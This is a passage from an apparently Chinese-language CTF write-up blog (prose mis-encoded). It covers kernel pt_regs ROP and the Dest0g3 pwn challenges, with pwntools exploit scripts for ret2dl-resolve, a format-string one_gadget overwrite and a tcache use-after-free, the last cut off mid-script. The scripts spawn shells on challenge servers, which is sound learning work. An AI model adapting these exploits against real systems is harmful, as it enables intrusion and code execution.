class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å½“ç”¨æˆ·æ€ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸æ€çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠæ‰€æœ‰çš„å¯„å­˜å™¨çš„å€¼å‹å…¥å†…æ ¸æ ˆåº•ï¼Œä¹Ÿå°±ç»„æˆäº†<code>pt_regs</code>ç»“æ„ä½“ã€‚å…¶ä¸­<code>r15~r8</code>å¯„å­˜å™¨æ˜¯å¯ä»¥åœ¨ç”¨æˆ·æ€é€šè¿‡å†…è”æ±‡ç¼–æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶å†…æ ¸æ ˆåº•çš„æ•°æ®äº†ï¼Œå¦‚æœæˆ‘ä»¬è¿˜èƒ½æ§åˆ¶ä¸€æ¬¡ç¨‹åºæµæ¯”å¦‚è¯´è™šè¡¨ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå½“è°ƒç”¨è¿™ä¸ªæŒ‡é’ˆçš„æ—¶å€™ï¼Œä»–åˆ°å†…æ ¸æ ˆåº•çš„åç§»æ˜¯å›ºå®šçš„ï¼Œé‚£å°±å¯ä»¥é€šè¿‡æŠŠå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆgadgetè·³åˆ°<code>r15~r8</code>ä¹‹é—´å®Œæˆrop</p>
<p>gadgetçš„æ¿å­ï¼š<code>add rsp, val ; ret</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/Dest0g3-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/27/Dest0g3-pwn/" class="post-title-link" itemprop="url">Dest0g3-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-27 13:58:46 / ä¿®æ”¹æ—¶é—´ï¼š13:59:26" itemprop="dateCreated datePublished" datetime="2022-05-27T13:58:46+08:00">2022-05-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Dest0g3-pwn"><a href="#Dest0g3-pwn" class="headerlink" title="Dest0g3  pwn"></a>Dest0g3  pwn</h1><p>ç®—æ˜¯æ¯”è¾ƒç®€å•çš„æ¯”èµ›ï¼Œæ¯•ç«Ÿæˆ‘éƒ½éƒ½åšå‡ºæ¥è¿™ä¹ˆå¤šé¢˜ï¼Œæ‰€æœ‰çš„é¢˜ç›®æ¼æ´éƒ½æ˜¯è£¸çš„ï¼Œæ‰€ä»¥éš¾ç‚¹éƒ½åœ¨å¦‚ä½•åˆ©ç”¨æ¼æ´èº«ä¸Šï¼Œå…¶ä¸­åé¢ä¸‰é“å †é¢˜éƒ½æ˜¯æ”»å‡»ioç»“æ„ï¼Œç¡®å®æœ‰ç‚¹æ¶å¿ƒã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527125626074.png" alt="image-20220527125626074"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527125647780.png" alt="image-20220527125647780"></p>
<h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾è§libcçš„ç‰ˆæœ¬ï¼ŒåŠ ä¸Šå¼€äº†å»¶è¿Ÿç»‘å®šï¼Œå¿ƒä¸€æ¨ªç›´æ¥æ‹¿ret2dlåšäº†ï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ret2dlæ”»å‡»ã€‚</p>
<p>ä¸»è¦ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dynamicæ®µ</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword     d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn_DYNAMIC[];</span><br><span class="line"></span><br><span class="line"><span class="comment">//rel.plt</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//dynsym</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼Œ_dl_runtime_resolveå‡½æ•°é€šè¿‡reloc_argå¯»å€åˆ°è¿™ä¸ªå‡½æ•°å¯¹åº”çš„é‡å®šä½è¡¨(ret.plt)ï¼Œè¿™ä¸ªå¯»å€æ˜¯åç§»å¯»å€ï¼Œç„¶åé€šè¿‡é‡å®šä½è¡¨çš„r_infoå¯»å€åˆ°å¯¹åº”çš„dynsymç¬¦å·é‡å®šä½è¡¨ï¼Œè¿™ä¸ªå¯»å€æ˜¯ä¸‹æ ‡å¯»å€ï¼Œè¦æ³¨æ„ç»“æ„ä½“çš„å¤§å°ï¼Œç„¶åé€šè¿‡ç»“æ„ä½“çš„st_nameå¯»å€åˆ°å¯¹åº”çš„dynstrï¼Œè¿™ä¸ªå¯»å€æ˜¯åç§»å¯»å€ï¼Œæ‰¾åˆ°çš„å°±æ˜¯å‡½æ•°çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²è¿”å›å¯¹åº”å‡½æ•°åœ°å€ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527131543243.png" alt="image-20220527131543243"></p>
<p>æ”»å‡»çš„æ–¹æ³•å°±æ˜¯è‡ªå·±æ„é€ å®Œæ•´çš„ä¸€å¥—ret.plt,dynsym,dynstr,ç„¶åæ„é€ reloc_arg,è®©å…¶æŒ‡å‘è‡ªå·±ä¼ªé€ çš„ret.pltå°±å¥½äº†ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29767</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rbx=<span class="number">0x08049022</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">hackme_addr=<span class="number">0x08049216</span></span><br><span class="line">pop_rbp=<span class="number">0x080494e3</span></span><br><span class="line">lea_ret=<span class="number">0x08049185</span></span><br><span class="line">_dl_runtime_resolve=<span class="number">0x8049030</span></span><br><span class="line">scanf_plt=elf.plt[<span class="string">&quot;__isoc99_scanf&quot;</span>]</span><br><span class="line">rel_plt=<span class="number">0x080483fc</span></span><br><span class="line">dynstr=<span class="number">0x08048308</span></span><br><span class="line">dynsym=<span class="number">0x08048248</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_num</span>(<span class="params">num</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input num&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_num</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_avg</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *&#123;0&#125;&#x27;.format(0x08049407))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input the length of array:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(-<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x804ca00</span>)</span><br><span class="line">    add_num(scanf_plt)</span><br><span class="line">    add_num(lea_ret)</span><br><span class="line">    add_num(<span class="number">0x0804A023</span>)</span><br><span class="line">    add_num(<span class="number">0x804ca00</span>+<span class="number">4</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(hackme_addr))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(hackme_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input the length of array:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_num(<span class="number">1</span>)</span><br><span class="line">    add_num(-<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x804c2b0</span>)</span><br><span class="line">    reloc_arg=<span class="number">0x4620</span></span><br><span class="line">    add_num(_dl_runtime_resolve)<span class="comment">#0x804ca08</span></span><br><span class="line">    add_num(reloc_arg)<span class="comment">#0x804ca0c</span></span><br><span class="line">    add_num(hackme_addr)<span class="comment">#0x804ca10</span></span><br><span class="line">    add_num(<span class="number">0x804ca48</span>)<span class="comment">#0x804ca14  /bin/sh_addr</span></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca18</span></span><br><span class="line">    <span class="comment">#fake_Elf32_Rel</span></span><br><span class="line">    add_num(elf.got[<span class="string">&quot;printf&quot;</span>])<span class="comment">#0x804ca1c</span></span><br><span class="line">    fake_r_info=(<span class="number">0x47e</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">    add_num(fake_r_info)<span class="comment">#0x804ca20</span></span><br><span class="line"></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca24</span></span><br><span class="line">    <span class="comment">#fake_Elf32_Sym</span></span><br><span class="line">    fake_st_name=<span class="number">0x4734</span><span class="comment">#0x804ca28</span></span><br><span class="line">    add_num(fake_st_name)<span class="comment">#0x804ca2c</span></span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x12</span>)</span><br><span class="line">    add_num(<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0x74737973</span>)<span class="comment">#0x804ca3c</span></span><br><span class="line">    add_num(<span class="number">0x6d65</span>)<span class="comment">#0x804ca40</span></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca44</span></span><br><span class="line">    add_num(<span class="number">0x6e69622f</span>)<span class="comment">#0x804ca48</span></span><br><span class="line">    add_num(<span class="number">0x68732f</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>å…¶å®æ²¡å¿…è¦è¿™ä¹ˆéº»çƒ¦çš„ï¼Œç›´æ¥æ‹¿ret2libcæ‰“å°±å¥½äº†</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,æˆ‘ç›´æ¥æ”¹è¿”å›åœ°å€ä¸ºoggæ‹¿shelläº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25438</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xde78c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde78f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde792 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;est0g3?\n&quot;</span>,timeout=<span class="number">100000</span>)</span><br><span class="line">    <span class="comment">#sleep(10)</span></span><br><span class="line">    sh.send(content.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+&#123;0&#125;)&quot;.format(0x1210))</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b printf&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pay=<span class="string">&#x27;%10$p %9$p&#x27;</span></span><br><span class="line">    <span class="comment">#pay=&#x27;%10$p %9$p %10$hhn&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    m=sh.recv(<span class="number">29</span>)</span><br><span class="line">    <span class="built_in">print</span> m</span><br><span class="line">    fmt_stack1=<span class="built_in">int</span>(m[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(fmt_stack1)</span><br><span class="line">    fmt_stack3=fmt_stack1-<span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line">    libc_addr=<span class="built_in">int</span>(m[<span class="number">15</span>:],<span class="number">16</span>)-<span class="number">0x28565</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(fmt_stack3&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    ogg_addr=<span class="number">0xde78f</span>+libc_addr</span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8f</span>)+<span class="string">&#x27;c%39$hhn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((fmt_stack3&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%10$hhn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg_addr&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)+<span class="string">&#x27;c%39$hn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;111111111111111111&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>é«˜ç‰ˆæœ¬çš„uaf,æ³¨æ„tcacheçš„fdçš„å¼‚æˆ–æ“ä½œå°±å¥½ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27314</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me its size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me its content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    new(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 